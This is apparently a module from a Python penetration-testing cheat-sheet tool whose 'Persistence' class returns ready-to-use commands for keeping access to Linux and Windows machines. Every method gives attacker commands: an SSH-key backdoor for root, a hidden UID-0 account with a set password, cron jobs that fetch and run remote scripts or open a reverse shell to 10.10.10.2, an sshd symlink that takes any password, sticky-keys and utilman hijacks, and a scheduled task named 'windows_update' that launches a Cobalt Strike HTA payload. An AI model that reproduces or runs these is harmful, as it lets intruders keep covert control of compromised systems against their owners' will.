# encoding: utf8
from .config import *

class Shell:
    def __init__(self):
        self.info = {
            'Name': 'Persistence',
            'Author': 'whois',
            'Update': '2019/7/06',
        }
        
    def SSHKey(self):
        return """
Metasploit Modules:
    post/linux/manage/sshkey_persistence
        
Step:
    1. ssh-keygen -t rsa (local)
    2. cat id_rsa.pub >> /root/.ssh/authorized_keys (upload)
    3. ssh -i id_rsa root@hostname (local)
"""


    def AddUser(self):
        return """
添加root权限账号：
    useradd -o -u 0 -M -s /bin/bash -g 0 -d /home/test god;(echo abc123;sleep 1;echo abc123) | passwd god

用户残留文件：
    /var/mail/god 
    /home/test

删除用户：
    userdel -r -f god
"""

    def Crontab(self):
        return """
每5分钟已root权限运行一次
    echo "*/5 * * * * curl -fsSL http://ip/i.sh | sh" >> /var/spool/cron/root

    echo "*/5 * * * * bash -i >& /dev/tcp/10.10.10.2/4455 0>&1" >> /var/spool/cron/root

    echo "*/5 * * * * /usr/bin/python -c \"import urllib2; exec urllib2.urlopen('http://10.10.10.2:4444/a').read();\"" >> /var/spool/cron/root 

"""

    def Ln(self):
        return """
对sshd建立软连接，任意密码登录
    ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=65521;

Hacker:
    ssh root@hostname -p 65521
"""


    def Shift(self):
        return """
sethc程序替换
    copy c:\windows\explorer.exe c:\windows\system32\sethc.exe
    copy c:\windows\system32\sethc.exe c:\windows\system32\dllcache\sethc.exe
    attrib c:\windows\system32\sethc.exe +h
    attrib c:\windows\system32\dllcache\sethc.exe +h

utilman程序替换
    REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe" /t REG_SZ /v Debugger /d "C:\\windows\\system32\\cmd.exe" /f
"""


    def Schtasks(self):
        return """
每分钟执行一次命令（只要当前任务存在就不会多执行，支持重启）
    schtasks /create /sc minute /mo 1 /tn "windows_update" /tr "mshta {0}"

    schtasks /create /sc ONLOGON /F /RL HIGHEST /tn update /tr "calc.exe"

立即执行一次
    schtasks /run /tn windows_update

删除
    schtasks /delete /f /tn windows_update

""".format(cobalt_hta)
        
